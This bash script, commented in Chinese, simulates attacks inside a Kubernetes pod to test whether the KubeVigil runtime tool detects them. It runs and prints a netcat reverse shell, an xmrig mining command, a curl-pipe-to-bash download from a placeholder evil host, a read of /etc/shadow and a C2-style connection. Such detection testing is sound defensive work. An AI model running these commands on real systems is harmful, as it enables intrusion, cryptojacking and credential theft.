#!/bin/bash
# KubeVigil 攻击模拟脚本
# 用于验证 KubeVigil 运行时检测能力
# 警告：仅在测试环境中使用！

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}========================================${NC}"
echo -e "${YELLOW}  KubeVigil 攻击模拟脚本${NC}"
echo -e "${YELLOW}  仅用于测试环境验证检测能力${NC}"
echo -e "${YELLOW}========================================${NC}"
echo ""

# 检查是否在容器中运行
if [ ! -f /proc/1/cgroup ]; then
    echo -e "${RED}错误: 此脚本应在 Kubernetes Pod 内运行${NC}"
    echo "使用方法: kubectl exec -it <pod-name> -- /bin/bash"
    exit 1
fi

echo -e "${GREEN}[1/5] 测试反弹 Shell 检测...${NC}"
echo "  模拟: nc -e /bin/bash 10.0.0.1 4444"
echo "  期望: KubeVigil 检测到 reverse-shell-detected (critical)"
if command -v nc &> /dev/null; then
    timeout 2 nc -e /bin/bash 10.0.0.1 4444 2>/dev/null || true
else
    echo "  (nc 不可用，跳过实际执行)"
fi
echo ""

echo -e "${GREEN}[2/5] 测试挖矿程序检测...${NC}"
echo "  模拟: xmrig --url pool.mine.xyz:3333"
echo "  期望: KubeVigil 检测到 crypto-mining (critical)"
if command -v xmrig &> /dev/null; then
    timeout 2 xmrig --url pool.mine.xyz:3333 2>/dev/null || true
else
    echo "  (xmrig 不可用，跳过实际执行)"
    echo "  可手动安装测试: apt-get install -y xmrig"
fi
echo ""

echo -e "${GREEN}[3/5] 测试可疑下载检测...${NC}"
echo "  模拟: curl http://evil.com/shell.sh | bash"
echo "  期望: KubeVigil 检测到 suspicious-download (high)"
if command -v curl &> /dev/null; then
    curl -s --connect-timeout 1 http://evil.example.com/shell.sh 2>/dev/null | head -c 0 || true
    echo "  curl http://evil.example.com/shell.sh | bash  # (未实际执行管道)"
else
    echo "  (curl 不可用，跳过)"
fi
echo ""

echo -e "${GREEN}[4/5] 测试敏感文件访问检测...${NC}"
echo "  模拟: cat /etc/shadow"
echo "  期望: KubeVigil 检测到 sensitive-file-access (high)"
if [ -f /etc/shadow ]; then
    cat /etc/shadow > /dev/null 2>&1 || true
else
    echo "  (/etc/shadow 不存在，尝试 /etc/passwd)"
    cat /etc/passwd > /dev/null 2>&1 || true
fi
echo ""

echo -e "${GREEN}[5/5] 测试 C2 通信检测...${NC}"
echo "  模拟: 连接到 203.0.113.50:4444"
echo "  期望: KubeVigil 检测到 c2-communication (critical)"
if command -v nc &> /dev/null; then
    timeout 2 nc -w 1 203.0.113.50 4444 2>/dev/null || true
else
    echo "  (nc 不可用，跳过实际执行)"
fi
echo ""

echo -e "${YELLOW}========================================${NC}"
echo -e "${YELLOW}  攻击模拟完成${NC}"
echo -e "${YELLOW}  请检查 KubeVigil 日志确认检测情况:${NC}"
echo -e "${YELLOW}  kubectl logs -n kubevigil -l app=kubevigil${NC}"
echo -e "${YELLOW}========================================${NC}"
